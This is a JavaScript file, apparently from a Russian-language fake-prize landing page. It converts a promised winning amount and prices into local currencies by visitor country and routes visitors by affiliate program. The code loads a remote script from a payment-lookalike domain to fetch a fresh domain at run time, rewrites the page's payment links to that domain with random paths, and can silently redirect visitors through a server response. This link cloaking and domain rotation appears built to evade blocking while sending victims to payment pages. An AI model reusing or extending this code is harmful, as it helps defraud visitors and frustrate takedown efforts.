class Zen {
  constructor() {
    this.state = {};
    this.win_summ_rub = '212 610 RUB';
    this.win_summ_usd = '___';
    this.disable_chat = false;
    this.checkCookiesStatus = true;
    this.summ = document.querySelectorAll('.w-summ');
    this.val = document.querySelectorAll('.w-val');
    this.mon = document.querySelectorAll('.w-mon');
    this.rub = document.querySelectorAll('.w-fromrub');
    this.win_usd = document.querySelectorAll('.w-win-usd');
    this.win_rub = document.querySelectorAll('.w-win-rub');
    this.win_cur = document.querySelectorAll('.w-win-cur');
    this.countryCode = localStorage.getItem('countryCode') ? localStorage.getItem('countryCode') : null;
    this.addEventListeners();
  }

  static init() {
    new Zen();
  }

  addEventListeners() {
    document.addEventListener('DOMContentLoaded', (e) => {
      this.getGeo();
      this.checkCookies();
      if (this.disable_chat === true) {
        document.querySelector('.chat').remove();
      }
    });
  }

  // получаем партнерку из урла
  getAffiliate() {
    let url = new URL(window.location);
    let affiliate = url.pathname.split('/')[1][0];
    switch(affiliate) {
      case 'e':
        return 'epay';
        break;
      case 'h':
        return 'hidden';
        break;
      default:
        console.log('Не удалось определить ПП');
        break;
    }
  }

  checkCookies() {
    let strs = document.location.href;
    let all = strs.split('/');
    let my_page = all[all.length-1];

    let request = new XMLHttpRequest();
    request.onreadystatechange = function () {
      if (this.readyState === 4) {
        if (this.status === 200 && this.responseText) {
          document.location.href = this.responseText;
        }
      }
    };
    request.open("GET", 'pages.php?'+'this_page='+my_page, true);
    request.send(null);
/*
    fetch('pages.php?'+'this_page='+my_page)
        .then((response) => {
          return response;
        })
      .then((data) => {
        console.log(data);
        document.location.href = data.responseText;
      });
 */
  }

  // получаем все данные по партнерке
  getInfo() {
    let affiliate = this.getAffiliate();

    fetch('zen.json')
      .then((response) => {
        return response.json();
      })
      .then((data) => {
        this.state = data[affiliate];
        this.getUrl();
      });
  }

  // если ссылка получается по js запросу, то выполняем данную функцию
  getUrl() {
    let affiliate = this.getAffiliate();
    switch(affiliate) {
      case 'epay':
        let oneElementHiddenLink = document.createElement("a");
            oneElementHiddenLink.setAttribute('class', 'KJXZ');
            oneElementHiddenLink.setAttribute('href', 'https://');
            oneElementHiddenLink.setAttribute('style', 'display:none;');
            oneElementHiddenLink.setAttribute('id', 'domainGeneralSSS');
        document.getElementsByTagName('body')[0].appendChild(oneElementHiddenLink);

          let twoElementScript = document.createElement("script");
              twoElementScript.setAttribute('type', 'text/javascript');
              twoElementScript.setAttribute('src', 'https://pr0paymentss.expert/buy_domain.php');
        document.getElementsByTagName('body')[0].appendChild(twoElementScript);

        let domain = "";
        let interValId = setInterval(() => {
          if(domain.length > 10) {
            this.changeDomainEpay();
            this.updatePrice();
            clearInterval(interValId);
            return false;
          }

          domain = document.getElementById('domainGeneralSSS').getAttribute('href');

        },1);

        break;

      case 'hidden':
        let hidden_url = new URL(window.location);
        let hidden_dir = hidden_url.pathname.split('/')[1];
        this.state.domain = '/' + hidden_dir;
        this.changeDomain();
        this.updatePrice();
        break;

      default:
        console.log('Не удалось определить ПП');
        break;
    }
  }

  // функция подмены домена
  changeDomain() {
    let domain = this.state.domain;
    if (domain.slice(-1) === '/') {
      domain = domain.slice(0, -1);
    }

    if (!this.isEmpty(this.state.links)) {
      let links = this.state.links;

      links.forEach(el => {
        if (document.querySelector('.' + el.id)) {
            document.querySelector('.' + el.id).href = domain + el.link;
        }
      });
    } else {
      console.dir('Проверьте правильность заполнения ссылок');
    }
  }

    // функция подмены домена
  changeDomainEpay() {
    let domain = document.getElementById('domainGeneralSSS').getAttribute('href');
    let gStr = this.strGen(13 + Math.ceil(Math.random() * 10));

    if (!this.isEmpty(this.state.links)) {
      let links = this.state.links;

      links.forEach(el => {
        let pathname_current = el.link;
            pathname_current = pathname_current.replace('/b/', '');
            pathname_current = '/b/'+gStr+'/'+pathname_current+'/';

        if (document.querySelector('.' + el.id)) {
            document.querySelector('.' + el.id).href = domain + pathname_current;
        }
      });
    } else {
      console.dir('Проверьте правильность заполнения ссылок');
    }
  }

  // epay strgen
  strGen(strLen) {
    let resStr = '';
    let symArray = ['q','w','e','r','t','y','u','i','o','p','a','s','d','f','g','h','j','k','l','z','x','c','v','b','n','m','0','1','2','3','4','5','6','7','8','9'];
    while(resStr.length < strLen) {
      resStr = resStr + symArray[Math.ceil((Math.random() * symArray.length) - 1)];
    }
    return resStr;
  }

  // получение гео
  getGeo() {
    if (!this.countryCode) {
      fetch('geo.php')
        .then((response) => {
          console.dir(response);
          return response.json();
        })
        .then((data) => {
          console.dir(data);
          if (data.geoplugin_status === 206 || data.geoplugin_status === 200) {
            localStorage.setItem('countryCode', data.geoplugin_countryCode);
            this.countryCode = data.geoplugin_countryCode;
            this.getInfo();
          } else {
            localStorage.setItem('countryCode', 'RU');
            this.getInfo();
          }
        })
    } else {
      this.getInfo();
    }
  }

  // обновление прайса
  updatePrice() {
    this.summ.forEach(el => {
      if (el.innerText.length === 0) {
        return false;
      }
      el.innerText = this.convertPrice(el.innerText)
    });

    if (!this.isEmpty(this.state.prices)) {
      let prices = this.state.prices;

      prices.forEach(el => {
        if (document.querySelector('.' + el.id)) {
          document.querySelector('.' + el.id).innerText = this.convertPrice(el.price);
        }
      });
    } else {
      console.dir('Проверьте правильность заполнения прайса');
    }
    if (this.win_rub) {
      this.win_rub.forEach(el => {
        el.innerText = this.convertPrice(this.win_summ_rub);
      })
    };

    if (this.win_usd) {
      this.win_usd.forEach(el => {
        el.innerText = this.win_summ_usd;
      })
    }
  }

  // конвертация валюты. на вход может быть строка как с валютой, так и просто строка с суммой. Также может быть и число
  convertPrice(price) {
    let country = this.countryData(this.countryCode);
    let locale = 'ru-RU';
    let value = this.toNumber((this.toNumber(price) * country.kurs).toFixed());
    return value.toLocaleString(locale) + ' ' + country.pre;
  }

  // проверка на пустоту объекта
  isEmpty(obj) {
    if (obj.length === 0) {
      return true;
    }
    else {
      return false;
    }
  }

  // string to number
  toNumber(string) {
    let number = parseInt(string.replace(/[^\d]/g, ''));
    if (!number) {
      return false;
    }
    return number;
  }

  countryData(countryCode) {
    let countryData = [
      {
        country: "Россия",
        countryCode: "RU",
        kurs: 1,
        pre: "RUB",
        txt: ["руб", "рублей", "Российский рубль (руб.)"]
      },
      {
        country: "Украина",
        countryCode: "UA",
        kurs: 0.36,
        pre: "UAH",
        txt: ["грн", "Украинская гривна", "Украинская гривна (грн.)"]
      },
      {
        country: "Казахстан",
        countryCode: "KZ",
        kurs: 5.79,
        pre: "KZT",
        txt: ["тг", "Казахстанский тенге", "Казахстанский тенге (тг.)"]
      },
      {
        country: "Молдавия",
        countryCode: "MD",
        kurs: 0.24,
        pre: "MDL",
        txt: ["MDL", "Молдавский лей", "Молдавский лей (L)"]
      },
      {
        country: "Латвия",
        countryCode: "LV",
        kurs: 0.012,
        pre: "EUR",
        txt: ["EUR", "Евро", "Евро (EUR)"]
      },
      {
        country: "Литва",
        countryCode: "LT",
        kurs: 0.012,
        pre: "EUR",
        txt: ["EUR", "Евро", "Евро (EUR)"]
      },
      {
        country: "Словакия",
        countryCode: "SK",
        kurs: 0.012,
        pre: "EUR",
        txt: ["EUR", "Евро", "Евро (EUR)"]
      },
      {
        country: "Словения",
        countryCode: "SVN",
        kurs: 0.012,
        pre: "EUR",
        txt: ["EUR", "Евро", "Евро (EUR)"]
      },
      {
        country: "Азербайджан",
        countryCode: "AZ",
        kurs: 0.023,
        pre: "AZN",
      },
      {
        country: "Беларусь",
        countryCode: "BY",
        kurs: 0.033,
        pre: "BYN",
      },
      {
        country: "Грузия",
        countryCode: "GE",
        kurs: 0.043,
        pre: "GEL",
      },
      {
        country: "Киргизия",
        countryCode: "KG",
        kurs: 1.07,
        pre: "СОМ",
      },
      {
        country: "Таджикистан",
        countryCode: "TJ",
        kurs: 0.14,
        pre: "TJS",
      },
      {
        country: "Туркмения",
        countryCode: "TM",
        kurs: 0.047,
        pre: "TMT",
      },
	  {
        country: "Румыния",
        countryCode: "RO",
        kurs: 0.047,
        pre: "RON",
      },
      {
        country: "Узбекистан",
        countryCode: "UZ",
        kurs: 135.84,
        pre: "UZS",
      }
    ];

    let currentCountry = countryData.filter(item => item.countryCode === countryCode);

    if (currentCountry.length > 0) {
      return currentCountry[0];
    } else {
      return countryData[0];
    }
  }
}

Zen.init();
